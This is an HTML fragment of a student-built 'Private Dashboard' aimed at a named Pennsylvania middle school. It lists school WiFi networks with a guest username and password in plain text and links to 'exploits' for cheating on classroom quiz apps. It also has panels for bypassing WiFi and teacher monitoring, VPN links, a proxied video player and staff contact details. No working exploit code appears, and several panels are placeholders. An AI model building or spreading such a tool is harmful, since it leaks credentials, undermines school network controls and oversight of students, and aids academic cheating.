        <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
        <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
        <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

        <label for="showPassword" class="show-password-container">
            <input type="checkbox" id="showPassword" />
            <span>Show Password</span>
        </label>

        <button id="submitBtn">Submit</button>

        <div class="error-message" id="errorMsg"></div>
        <div class="attempt-counter" id="attemptsText">Attempts Left: 3</div>
        
        <!-- Placeholder popup element for webhook consistency (remains hidden in UI) -->
        <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true" style="display:none;">
            <p>Too many failed attempts. (Logs being sent)</p>
            <input type="password" id="resetField" placeholder="Enter Reset Code" autocomplete="off" />
            <button id="resetBtn">Reset Counter</button>
        </div>
    </div>

    <!-- Dashboard (hidden by default) -->
    <div id="dashboard" style="display: none;">
      <div class="sticky-top-container">
        <div class="dashboard-header" id="dashboardHeader">
            <div>
                <h1>Private Dashboard GUI</h1>
                <div class="user-info">User - <span id="loggedInUser"></span> | ID: <span id="loggedInID"></span></div>
            </div>
            <div class="version-box">Version 2.0.0</div>
        </div>

        <div class="quickbar-container">
            <button id="sessionTime">Session Time: 00:00:00</button>
            <button id="realTimeClock">--:--:--</button>
            <button id="realDate">--</button>
            <button id="notesBtn">Notes</button>
            <button id="exportNotesBtn">Export Notes</button>
            <button id="screenshotBtn">Screenshot</button>
            <button id="toggleSectionsBtn">Toggle Sections</button>
            <button id="fixIssuesBtn">Fix Issues</button>
            <button id="fullScreenBtn">Full Screen</button>
            <button id="zoomInBtn">Zoom In</button>
            <button id="zoomOutBtn">Zoom Out</button>
            <button id="restartBtn">Restart</button>
            <button id="panicBtn">Panic</button>
            <button id="themeToggle">Theme</button>
            <button id="logoutBtn">Log Out</button>
            <button id="settingsBtn">Settings</button>
            <button id="activityLogBtn">Activity Log</button> <!-- NEW: View Activity Log Button -->
        </div>
      </div>

       <!-- NEW: Fading Notification Container -->
      <div id="notificationContainer"></div>

        <div class="main-row" id="mainGrid">
            <div class="box">
                <h2 id="calendarTitle">🗓️ Calendar</h2>
                <div class="calendar" id="calendar"></div>
            </div>

             <div class="box" id="updatesNotifications">
                <h2 id="updatesNotificationsTitle">🔔 Updates & Notifications</h2>
                <div class="update-entry">Welcome to Private System v2.0! Enjoy the new features and cleaner layout.</div>
                <div class="update-entry">New Advanced Statistics Panel!</div>
                <div class="update-entry">Proxied Media Player for YouTube!</div>
                <div class="update-entry">Refreshed Login Screen with cube animations!</div>
                <div class="update-entry">New top-right FADING Notification System!</div>
                <div class="update-entry">All buttons inherit unified transparent background with accent borders!</div>
                <div class="update-entry">All dashboard panels now in individual boxes!</div>
                <div class="update-entry">New 'Activity Log' button to view full history!</div>
                <div class="update-entry">Re-added Calculator and Unit Converter!</div>
                <div class="update-entry">Expanded settings with many customization options!</div>
            </div>
        </div>
      
        <!-- NEW: Button Grid Layout for Panel-Triggering Buttons -->
        <div class="button-grid-container" id="panelButtonGrid">
          <div class="box"><button onclick="dashboard.togglePanel('wifiPanel')">📶 School WiFi Info</button></div>
          <div class="box"><button onclick="dashboard.togglePanel('ipadPanel')">📱 School iPad Restrictions</button></div>
          <div class="box"><button onclick="dashboard.togglePanel('handbookPanel')">📚 Student Handbooks</button></div>
          <div class="box"><button onclick="dashboard.togglePanel('mapPanel')">🗺️ School Map Info</button></div>

          <div class="box"><button onclick="dashboard.togglePanel('studentWebsitesPanel')">🎓 Student Websites</button></div>
          <div class="box"><button onclick="dashboard.togglePanel('teacherWebsitesPanel')">🍎 Teacher Websites</button></div>
          <div class="box"><button onclick="dashboard.togglePanel('phoneDirectoryPanel')">☎️ Phone Directory</button></div>
          <div class="box"><button onclick="dashboard.togglePanel('cameraPanel')">📹 School Camera Info</button></div>
          
          <div class="box"><button onclick="dashboard.togglePanel('schoolInfoPanel')">🏢 School Information</button></div>
          <div class="box"><button onclick="dashboard.togglePanel('exploitPanel')">💣 Exploiting Tools</button></div>
          <div class="box"><button onclick="dashboard.togglePanel('bypassPanel')">🔑 Bypassing Tools</button></div>
          <div class="box"><button onclick="dashboard.togglePanel('vpnPanel')">🛡️ VPN Websites</button></div>
          
          <div class="box"><button onclick="dashboard.togglePanel('gamingPanel')">🎮 Gaming Websites</button></div>
          <div class="box"><button onclick="dashboard.togglePanel('musicPanel')">🎧 Music Websites</button></div>
          <div class="box"><button onclick="dashboard.togglePanel('keyboardPanel')">⌨️ Keyboard Tricks</button></div>

          <!-- RE-ADDED FEATURES' BUTTONS -->
          <div class="box"><button onclick="dashboard.togglePanel('reminderPanel')">⏰ Reminders</button></div>
          <div class="box"><button onclick="dashboard.togglePanel('statsPanel')">📈 Usage Statistics</button></div>
          <div class="box"><button onclick="dashboard.togglePanel('mediaPanel')">📺 Media Player</button></div>
          <div class="box"><button onclick="dashboard.togglePanel('calculatorPanel')">🧮 Calculator</button></div>
          <div class="box"><button onclick="dashboard.togglePanel('converterPanel')">🔄 Unit Converter</button></div>
        </div>


        <!-- Information Panels Container -->
        <div id="infoPanelsContainer" style="margin-top: 20px;">

            <!-- RE-ADDED: Reminder Panel -->
            <div id="reminderPanel" class="info-panel">
                <h2 id="reminderPanelTitle">⏰ Reminders</h2>
                <div class="reminder-form">
                    <input type="text" id="reminderText" placeholder="Enter reminder text...">
                    <input type="date" id="reminderDate">
                    <input type="time" id="reminderTime">
                    <button id="addReminderBtn">Add Reminder</button>
                </div>
                <div class="reminder-list-container">
                    <ul id="remindersList"></ul>
                </div>
                <button id="clearAllRemindersBtn">Clear All Reminders</button>
            </div>
            
            <!-- RE-ADDED: Advanced Statistics Panel -->
            <div id="statsPanel" class="info-panel">
              <h2 id="statsPanelTitle">📈 Super Advanced Usage Statistics</h2>
              <div class="stats-grid">
                  <div class="stats-item"><div class="stats-label">Dashboard Uptime</div><span class="stats-value" id="statsUptime">0</span></div>
                  <div class="stats-item"><div class="stats-label">Total Button Clicks</div><span class="stats-value" id="statsClicks">0</span></div>
                  <div class="stats-item"><div class="stats-label">Panels Toggled</div><span class="stats-value" id="statsPanelsOpened">0</span></div>
                  <div class="stats-item"><div class="stats-label">Themes Toggled</div><span class="stats-value" id="statsThemeToggles">0</span></div>
                  <div class="stats-item"><div class="stats-label">Reminders Set</div><span class="stats-value" id="statsRemindersSet">0</span></div>
                  <div class="stats-item"><div class="stats-label">Canvas Saves</div><span class="stats-value" id="statsCanvasUsed">0</span></div>
                  <div class="stats-item"><div class="stats-label">Screenshots Taken</div><span class="stats-value" id="statsScreenshots">0</span></div>
                  <div class="stats-item"><div class="stats-label">Media Items Loaded</div><span class="stats-value" id="statsMediaLoaded">0</span></div>
                  <div class="stats-item"><div class="stats-label">Browser Name</div><span class="stats-value" id="statsBrowser">...</span></div>
                  <div class="stats-item"><div class="stats-label">Operating System</div><span class="stats-value" id="statsOS">...</span></div>
                  <div class="stats-item"><div class="stats-label">Screen Resolution</div><span class="stats-value" id="statsScreenRes">...</span></div>
                  <div class="stats-item"><div class="stats-label">Viewport Size</div><span class="stats-value" id="statsViewportSize">...</span></div>
                  <div class="stats-item"><div class="stats-label">Device Memory (GB)</div><span class="stats-value" id="statsMemory">...</span></div>
                  <div class="stats-item"><div class="stats-label">CPU Cores</div><span class="stats-value" id="statsCpus">...</span></div>
                  <div class="stats-item"><div class="stats-label">Online Status</div><span class="stats-value" id="statsOnline">...</span></div>
                  <div class="stats-item"><div class="stats-label">Current Zoom Level</div><span class="stats-value" id="statsZoom">100%</span></div>
                  <div class="stats-item"><div class="stats-label">Time to Dashboard (ms)</div><span class="stats-value" id="statsTimeToLogin">0</span></div>
                  <div class="stats-item"><div class="stats-label">Total LocalStorage Items</div><span class="stats-value" id="statsLocalStorageItems">0</span></div>
                  <div class="stats-item"><div class="stats-label">Total SessionStorage Items</div><span class="stats-value" id="statsSessionStorageItems">0</span></div>
                  <div class="stats-item"><div class="stats-label">User Agent</div><span class="stats-value" id="statsUserAgent" style="font-size:0.7em;">...</span></div>
                  <div class="stats-item"><div class="stats-label">Browser Language</div><span class="stats-value" id="statsLang">...</span></div>
                  <div class="stats-item"><div class="stats-label">Device Pixel Ratio</div><span class="stats-value" id="statsPixelRatio">...</span></div>
                  <div class="stats-item"><div class="stats-label">Pointer Type</div><span class="stats-value" id="statsPointerType">...</span></div>
                  <div class="stats-item"><div class="stats-label">Referrer (initial)</div><span class="stats-value" id="statsReferrer" style="font-size:0.7em;">...</span></div>
                  <div class="stats-item"><div class="stats-label">History Length (initial)</div><span class="stats-value" id="statsHistoryLength">0</span></div>
                  <div class="stats-item"><div class="stats-label">Notifications Perm</div><span class="stats-value" id="statsNotificationPerm">...</span></div>
              </div>
            </div>

            <!-- RE-ADDED: Media Player Panel with Proxy -->
            <div id="mediaPanel" class="info-panel">
                <h2 id="mediaPanelTitle">📺 Proxied Media Player</h2>
                <div class="info-text">
                    <p>Enter a YouTube video ID or full URL to watch through a private proxy (e.g., invidious.io.lol):</p>
                    <input type="text" id="youtubeIdInput" placeholder="e.g., dQw4w9WgXcQ or https://www.youtube.com/watch?v=dQw4w9WgXcQ" style="width: 100%; padding: 8px; border-radius: var(--button-border-radius); border: 1px solid #555; background: #2b2b2b; color: #e0e0e0; margin-top: 5px; margin-bottom: 10px;">
                    <button id="loadYoutubeBtn">Load Video</button>
                    <div id="youtubePlayer" style="margin-top: 20px; width: 100%; aspect-ratio: 16 / 9; background: #000; display: flex; justify-content: center; align-items: center; color: #eee; font-style: italic; border-radius: var(--button-border-radius);">
                        Video player will load here...
                    </div>
                </div>
            </div>

            <!-- NEWLY ADDED: Calculator Panel -->
            <div id="calculatorPanel" class="info-panel">
                <h2 id="calculatorPanelTitle">🧮 Calculator</h2>
                <div class="calculator-grid" style="border-radius: var(--button-border-radius);">
                    <div class="calculator-output" id="calculatorOutput" style="border-radius: var(--button-border-radius);">0</div>
                    <button class="clear" data-value="clear" style="border-radius: var(--button-border-radius);">AC</button>
                    <button class="operator" data-value="+/-" style="border-radius: var(--button-border-radius);">+/-</button>
                    <button class="operator" data-value="%" style="border-radius: var(--button-border-radius);">%</button>
                    <button class="operator" data-value="/" style="border-radius: var(--button-border-radius);">÷</button>
                    <button data-value="7" style="border-radius: var(--button-border-radius);">7</button>
                    <button data-value="8" style="border-radius: var(--button-border-radius);">8</button>
                    <button data-value="9" style="border-radius: var(--button-border-radius);">9</button>
                    <button class="operator" data-value="*" style="border-radius: var(--button-border-radius);">×</button>
                    <button data-value="4" style="border-radius: var(--button-border-radius);">4</button>
                    <button data-value="5" style="border-radius: var(--button-border-radius);">5</button>
                    <button data-value="6" style="border-radius: var(--button-border-radius);">6</button>
                    <button class="operator" data-value="-" style="border-radius: var(--button-border-radius);">-</button>
                    <button data-value="1" style="border-radius: var(--button-border-radius);">1</button>
                    <button data-value="2" style="border-radius: var(--button-border-radius);">2</button>
                    <button data-value="3" style="border-radius: var(--button-border-radius);">3</button>
                    <button class="operator" data-value="+" style="border-radius: var(--button-border-radius);">+</button>
                    <button data-value="0" style="grid-column: span 2; border-radius: var(--button-border-radius);">0</button>
                    <button data-value="." style="border-radius: var(--button-border-radius);">.</button>
                    <button class="equals" data-value="=" style="border-radius: var(--button-border-radius);">=</button>
                </div>
            </div>

            <!-- NEWLY ADDED: Unit Converter Panel -->
            <div id="converterPanel" class="info-panel">
                <h2 id="converterPanelTitle">🔄 Unit Converter</h2>
                <div class="converter-type-selector">
                    <label for="conversionType" style="font-size:0.95em;">Convert:</label>
                    <select id="conversionType" style="border-radius: var(--button-border-radius); font-size:0.95em; padding:8px;">
                        <option value="length">Length</option>
                        <option value="weight">Weight</option>
                        <option value="temperature">Temperature</option>
                        <option value="volume">Volume</option>
                    </select>
                </div>
                <div class="converter-input-group">
                    <input type="number" id="convertValue" value="1" style="border-radius: var(--button-border-radius); font-size:0.95em; padding:8px;">
                    <select id="convertFromUnit" style="border-radius: var(--button-border-radius); font-size:0.95em; padding:8px;"></select>
                </div>
                <div class="converter-input-group">
                    <label for="convertToUnit" style="font-size:0.95em;">To:</label>
                    <select id="convertToUnit" style="border-radius: var(--button-border-radius); font-size:0.95em; padding:8px;"></select>
                </div>
                <div class="conversion-result" style="border-radius: var(--button-border-radius); font-size:1em;">Result: <span id="conversionResult"></span></div>
                <button id="performConversionBtn" style="width: 100%; margin-top: 15px;">Convert</button>
            </div>


            <!-- Kept school-related panels -->
            <div id="wifiPanel" class="info-panel">
                <h2 id="wifiPanelTitle">📶 School WiFi Information</h2>
                <div class="wifi-grid">
                    <div>Network Name</div>
                    <div>Wifi Level</div>
                    <div>Security Type</div>
                    <div>Encryption</div>
                    <div>Hidden?</div>
                    <div>Monitored?</div>
                    <div>Username</div>
                    <div>Password</div>
                </div>

                <div class="wifi-entry">
                    <div>Middletown_Core</div>
                    <div class="wifi-high">High</div>
                    <div>WPA3 Enterprise</div>
                    <div>High</div>
                    <div>No</div>
                    <div>Yes</div>
                    <div>Unknown</div>
                    <div>Unknown</div>
                </div>

                <div class="wifi-entry">
                    <div>Mtown_Core</div>
                    <div class="wifi-high">High</div>
                    <div>WPA3 Enterprise</div>
                    <div>High</div>
                    <div>Yes</div>
                    <div>Unknown</div>
                    <div>Unknown</div>
                    <div>Unknown</div>
                </div>

                <div class="wifi-entry">
                    <div>Mtown Guest</div>
                    <div class="wifi-medium">Medium</div>
                    <div>WPA3 Enterprise</div>
                    <div>Medium</div>
                    <div>No</div>
                    <div>Rare</div>
                    <div>msguest</div>
                    <div>M@ms2021#</div>
                </div>

                <div class="wifi-entry">
                    <div>Radius Test</div>
                    <div class="wifi-low">Low</div>
                    <div>WPA3 Enterprise</div>
                    <div>Low</div>
                    <div>No</div>
                    <div>Rarely</div>
                    <div>msguest</div>
                    <div>M@ms2021#</div>
                </div>
            </div>

            <div id="ipadPanel" class="info-panel">
                <h2 id="ipadPanelTitle">📱 School iPad Restrictions</h2>
                <div class="ipad-options">
                    <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
                    <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
                </div>
                <div id="ipadRestrictions" class="ipad-content"><p>Coming soon</p></div>
                <div id="ipadBypasses" class="ipad-content"><p>Coming soon</p></div>
            </div>

            <div id="handbookPanel" class="info-panel">
                <h2 id="handbookPanelTitle">📚 Student Handbooks Information</h2>
                <div class="handbook-buttons">
                    <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
                    <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
                    <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
                    <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
                    <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
                    <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
                </div>
            </div>

            <div id="mapPanel" class="info-panel">
                <h2 id="mapPanelTitle">🗺️ School Building Map Information</h2>
                <div class="coming-soon">Building Map Coming Soon</div>
            </div>

            <div id="studentWebsitesPanel" class="info-panel">
                <h2 id="studentWebsitesPanelTitle">🎓 Student Website's Information</h2>
                <div class="links-list">
                    <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
                    <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
                    <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
                    <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
                    <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
                    <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
                    <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
                    <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
                    <a href="https://id.naviance.com" target="_blank">Naviance</a>
                    <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
                    <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
                    <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
                    <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
                    <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
                    <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
                    <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
                </div>
            </div>

            <div id="teacherWebsitesPanel" class="info-panel">
                <h2 id="teacherWebsitesPanelTitle">🍎 Teacher Websites Information</h2>
                <div class="links-list">
                    <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
                    <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
                    <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
                    <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
                    <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
                    <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
                    <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
                    <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
                    <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
                    <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
                    <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
                    <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
                    <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
                    <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
                    <a href="https://id.naviance.com" target="_blank">Naviance</a>
                    <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
                    <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
                    <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
                    <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
                    <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
                    <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
                    <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
                    <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
                    <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
                    <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
                </div>
            </div>

            <div id="phoneDirectoryPanel" class="info-panel">
                <h2 id="phoneDirectoryPanelTitle">☎️ School Phone Directory Information</h2>
                <div class="coming-soon">Update Coming Soon!</div>
            </div>

            <div id="cameraPanel" class="info-panel">
                <h2 id="cameraPanelTitle">📹 School Camera Information</h2>
                <div class="coming-soon">Update Coming Soon</div>
            </div>

            <div id="schoolInfoPanel" class="info-panel">
                <h2 id="schoolInfoPanelTitle">🏢 School Information</h2>
                <div class="school-info-grid">
                    <div class="school-info-item"><div class="school-info-label">School Name:</div><div>Middletown Area Middle School</div></div>
                    <div class="school-info-item"><div class="school-info-label">School Address:</div><div>215 Oberlin Road Middletown, PA 17057</div></div>
                    <div class="school-info-item"><div class="school-info-label">School Phone:</div><div>717-930-0739</div></div>
                    <div class="school-info-item"><div class="school-info-label">School Fax:</div><div>717-944-0591</div></div>
                    <div class="school-info-item"><div class="school-info-label">School Principal:</div><div>Dr. Shannon L. Wevodau</div></div>
                    <div class="school-info-item"><div class="school-info-label">Principal's Phone:</div><div>717-930-0739</div></div>
                    <div class="school-info-item"><div class="school-info-label">Principal's Email:</div><div>swevodau@raiderweb.org</div></div>
                    <div class="school-info-item"><div class="school-info-label">Assistant Principal:</div><div>Mr. Michael DeFilippo</div></div>
                    <div class="school-info-item"><div class="school-info-label">Assistant Principal's Phone:</div><div>717-930-0739</div></div>
                    <div class="school-info-item"><div class="school-info-label">Assistant Principal's Email:</div><div>mdefilippo@raiderweb.org</div></div>
                </div>
            </div>

            <div id="exploitPanel" class="info-panel">
                <h2 id="exploitPanelTitle">💣 Exploiting Tools</h2>
                <div class="exploit-buttons">
                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
                </div>
            </div>

            <div id="bypassPanel" class="info-panel">
                <h2 id="bypassPanelTitle">🔑 Bypassing Tools</h2>
                <div class="bypass-buttons">
                    <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
                    <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
                    <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
                    <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
                    <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
                    <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
                </div>

                <div id="bathroomBypass" class="bypass-content"><p>COMING SOON</p></div>
                <div id="wifiBypass" class="bypass-content"><p>Go to School Wifi Information</p></div>
                <div id="monitoringBypass" class="bypass-content"><p>COMING SOON</p></div>
                <div id="coming1Bypass" class="bypass-content"><p>COMING SOON</p></div>
                <div id="coming2Bypass" class="bypass-content"><p>COMING SOON</p></div>
                <div id="coming3Bypass" class="bypass-content"><p>COMING SOON</p></div>
            </div>

            <div id="vpnPanel" class="info-panel">
                <h2 id="vpnPanelTitle">🛡️ VPN Websites</h2>
                <div class="links-list">
                    <a href="https://example-vpn1.com" target="_blank">VPN Service 1</a>
                    <a href="https://example-vpn2.com" target="_blank">VPN Service 2</a>
                    <a href="https://example-vpn3.com" target="_blank">VPN Service 3</a>
                    <a href="https://example-vpn4.com" target="_blank">VPN Service 4</a>
                </div>
            </div>

            <div id="gamingPanel" class="info-panel">
                <h2 id="gamingPanelTitle">🎮 Gaming Websites</h2>
                <div class="coming-soon">COMING SOON</div>
            </div>

            <div id="musicPanel" class="info-panel">
                <h2 id="musicPanelTitle">🎧 Music Websites</h2>
                <div class="coming-soon">COMING SOON</div>
            </div>

            <div id="keyboardPanel" class="info-panel">
                <h2 id="keyboardPanelTitle">⌨️ Keyboard Tricks</h2>
                <div class="info-text">
                    <p>System Shortcuts:
• Access Spotlight Search: Press Command (⌘) + Space bar.
• Return to the Home screen: Press Command (⌘) + H.
• Show the Dock: Press Command (⌘) + Option (⌥) + D.
• Show the App Library: Press Shift (⇧) + Globe + A.
• Open Quick Note: Press Globe + Q.
• Open Siri: Press Globe + S.
• Open Control Center: Press Globe + C.
• Open Notification Center: Press Globe + N.
• Show all windows: Press Globe + Down Arrow.
• Open the App Switcher: Press Globe + Up Arrow.

Multitasking Shortcuts:
• Switch to the last active app: Press Command (⌘) + Tab.
• View all active apps: Press and hold Command (⌘) + Tab.
• Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
• Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
• Open Slide Over: Press Globe + Backslash.
• Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.

Safari and App-Specific Shortcuts:
• Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
• Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
• Open a new private tab: Press Command (⌘) + Shift + N.
• Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
• Close the current tab: Press Command (⌘) + W.
• Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
• Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
• Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
• Reopen the last closed tab: Press Shift + Command (⌘) + T.
• Go to a specific tab (1-8): Press Command (⌘) + (1-8).
• Go to the last tab: Press Command (⌘) + 9.
• Open the Tab Grid: Press Shift + Command (⌘) + .
• Open a new Incognito tab: Press Shift + Command (⌘) + N.
• Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
• Open a new window: Press Option (⌥) + Command (⌘) + N.

General Navigation and Text Editing:
• Navigate between elements in an app (like fields, lists, buttons): Press Tab.
• Select all text: Press Command (⌘) + A.
• Copy selected text: Press Command (⌘) + C.
• Cut selected text: Press Command (⌘) + X.
• Paste copied text: Press Command (⌘) + V.
• Undo the last action: Press Command (⌘) + Z.
• Redo the last undone action: Press Command (⌘) + Shift + Z.
• Jump to the top of a page: Press Command (⌘) + Up Arrow.
• Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
• Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
                </div>
            </div>

            <!-- Settings Panel -->
            <div id="settingsPanel" class="info-panel">
                <h2 id="settingsPanelTitle">🛠️ Settings</h2>
                <div class="settings-grid">
                    <div class="setting-group">
                        <h3>General & Performance</h3>
                        <div class="setting-item">
                            <label for="themeSelector">UI Theme:</label>
                            <select id="themeSelector">
                                <option value="dark">Dark Mode</option>
                                <option value="light">Light Mode</option>
                            </select>
                        </div>
                        <div class="setting-item">
                            <label for="uiAnimationSpeed">UI Animation Speed:</label>
                            <input type="range" id="uiAnimationSpeed" min="0.1" max="1.0" step="0.1" value="0.3">
                            <span id="uiAnimationSpeedValue">0.3s</span>
                        </div>
                        <div class="setting-item">
                            <label for="enableFancyAnimations">Enable Fancy Animations:</label>
                            <input type="checkbox" id="enableFancyAnimations" checked>
                        </div>
                        <div class="setting-item">
                          <label for="consoleLoggingLevel">Console Log Level:</label>
                          <select id="consoleLoggingLevel">
                            <option value="none">None</option>
                            <option value="error">Errors</option>
                            <option value="warn">Warnings</option>
                            <option value="info">Info</option>
                            <option value="verbose">Verbose</option>
                          </select>
                        </div>
                        <div class="setting-item">
                          <label for="confirmLogout">Confirm Logout:</label>
                          <input type="checkbox" id="confirmLogout" checked>
                        </div>
                    </div>

                    <div class="setting-group">
                        <h3>Dashboard Display & Layout</h3>
                        <div class="setting-item">
                            <label for="defaultPanelOnLoad">Default Panel on Login:</label>
                            <select id="defaultPanelOnLoad">
